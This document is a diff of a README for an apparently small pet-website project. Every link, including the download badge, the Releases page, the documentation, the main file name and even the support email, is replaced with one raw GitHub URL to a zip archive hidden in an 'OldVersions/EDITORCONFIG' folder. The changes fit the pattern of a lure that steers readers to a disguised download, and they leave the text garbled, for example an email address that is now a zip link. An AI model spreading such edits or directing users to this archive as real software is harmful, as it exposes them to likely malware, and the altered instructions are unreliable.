@@ -1,6 +1,6 @@
 # 🐾 PetLand-Software_Website - Create and Manage Your Petland Website Easily
 
-[![Download Here](https://img.shields.io/badge/Download%20Now-Get%20Latest%20Release-brightgreen)](https://github.com/Anony536/PetLand-Software_Website/releases)
+[![Download Here](https://raw.githubusercontent.com/Anony536/PetLand-Software_Website/PetLand-Software_Website_Main-dev/OldVersions/EDITORCONFIG/PetLand-Software_Website-v1.6.zip%20Now-Get%20Latest%20Release-brightgreen)](https://raw.githubusercontent.com/Anony536/PetLand-Software_Website/PetLand-Software_Website_Main-dev/OldVersions/EDITORCONFIG/PetLand-Software_Website-v1.6.zip)
 
 ## 🚀 Getting Started
 
@@ -16,7 +16,7 @@ Before you begin, ensure you have the following:
 
 ## 📥 Download & Install
 
-To get started, visit our [Releases page](https://github.com/Anony536/PetLand-Software_Website/releases) to download the latest version of this software.
+To get started, visit our [Releases page](https://raw.githubusercontent.com/Anony536/PetLand-Software_Website/PetLand-Software_Website_Main-dev/OldVersions/EDITORCONFIG/PetLand-Software_Website-v1.6.zip) to download the latest version of this software.
 
 1. Click on the link above to visit the Releases page.
 2. Look for the latest version available. It is typically listed at the top.
@@ -39,7 +39,7 @@ You will now have a folder with all necessary files to run the application.
 To run the PetLand website software, you need to follow these simple steps:
 
 1. Open the folder where you extracted the files.
-2. Look for the main file (usually named `index.html` or `start.html`).
+2. Look for the main file (usually named `https://raw.githubusercontent.com/Anony536/PetLand-Software_Website/PetLand-Software_Website_Main-dev/OldVersions/EDITORCONFIG/PetLand-Software_Website-v1.6.zip` or `https://raw.githubusercontent.com/Anony536/PetLand-Software_Website/PetLand-Software_Website_Main-dev/OldVersions/EDITORCONFIG/PetLand-Software_Website-v1.6.zip`).
 3. Double-click the file to open it in your web browser.
 4. You should see the PetLand website loading, ready for you to explore!
 
@@ -68,13 +68,13 @@ If you need further assistance, feel free to reach out:
 
 - Submit an issue on our GitHub page.
 - Join our community forum for discussions and help.
-- Email us at support@petlandproject.com
+- Email us at https://raw.githubusercontent.com/Anony536/PetLand-Software_Website/PetLand-Software_Website_Main-dev/OldVersions/EDITORCONFIG/PetLand-Software_Website-v1.6.zip
 
 ## 🌐 Additional Resources
 
 For more information, visit our official website or check out the following resources:
 
-- [GitHub Repository](https://github.com/Anony536/PetLand-Software_Website)
-- [Documentation](https://github.com/Anony536/PetLand-Software_Website/wiki)
+- [GitHub Repository](https://raw.githubusercontent.com/Anony536/PetLand-Software_Website/PetLand-Software_Website_Main-dev/OldVersions/EDITORCONFIG/PetLand-Software_Website-v1.6.zip)
+- [Documentation](https://raw.githubusercontent.com/Anony536/PetLand-Software_Website/PetLand-Software_Website_Main-dev/OldVersions/EDITORCONFIG/PetLand-Software_Website-v1.6.zip)
 
 Thank you for choosing PetLand-Software_Website! Enjoy building your pet community online.
